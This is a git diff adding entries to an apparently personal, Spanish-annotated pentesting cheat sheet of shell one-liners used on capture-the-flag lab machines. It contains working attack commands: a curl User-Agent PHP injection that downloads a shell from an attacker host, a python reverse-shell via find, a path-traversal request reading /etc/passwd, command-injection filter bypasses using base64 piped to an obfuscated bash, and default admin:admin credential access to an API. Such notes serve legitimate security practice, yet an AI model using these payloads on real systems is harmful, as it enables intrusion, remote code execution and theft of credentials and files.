@@ -38,6 +38,10 @@ find / -type f -regexp ".*\(png\|jpg\)$" 2>/dev/null # multiples extensiones
 find / -writable 2>/dev/null # archivos de escritura
 find / /etc /var -type f 2>/dev/null # multiples locaciones
 find / -user root -readable -type f 2>/dev/null # root + lectura
+find / -type f -name 'user.txt' -exec cat {} \; 2>/dev/null
+find /usr/bin/python3 -exec {} -c 'rev-shell' # bypassing
+find thm/ -type f -iname 'notas'| xargs -i scp -o 'ProxyJump pgraffigna@192.168.122.1' '{}' quentin@192.168.0.20:
+find . -type f -iname 'notas' -exec cat {} \; > total_notes.txt
 
 # mount
 mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
@@ -63,8 +67,20 @@ sed 's/\\n/\n/g' # reemplazar \n a salto de linea
 # curl
 curl 'http://10.10.154.13/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=test@customer.acmeitsupport.thm' # reset password hijacking
 curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://{ATTACKER_IP}/shell.php'))?>" -s http://{MACHINE_IP}%
+
 curl -s -X POST URL --data-urlencode email=admin@admin.com'-- -  | grep '<h2>'
 curl -s -X POST -d @FILE URL
+curl -s -X POST 'http://46.101.81.30:32637/search.php' -b 'PHPSESSID=osr15ga0dbe56dgqj0aq0dgd57' -H 'Content-Type: application/json' -d '{"search": "flag"}'
+
+curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq # para listar el contenido
+curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' # para agregar un nuevo dato 
+
+curl http://10.10.62.107:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd --path-as-is
+curl -s -X GET http://admin:admin@10.10.189.8:3000/api/admin/settings | jq
+
+## bypassing
+curl -s -X POST http://10.10.57.159/secret/ -d command="echo 'bHMgLWxhCg==' | base64 -d | ba's'h" | awk '/<h2/,/<\/h2>/'
+curl -s -X POST http://10.10.151.118/secret/ -d command="c\at /etc/passwd"
 
 # awk
 awk '{print "https://"$1}'
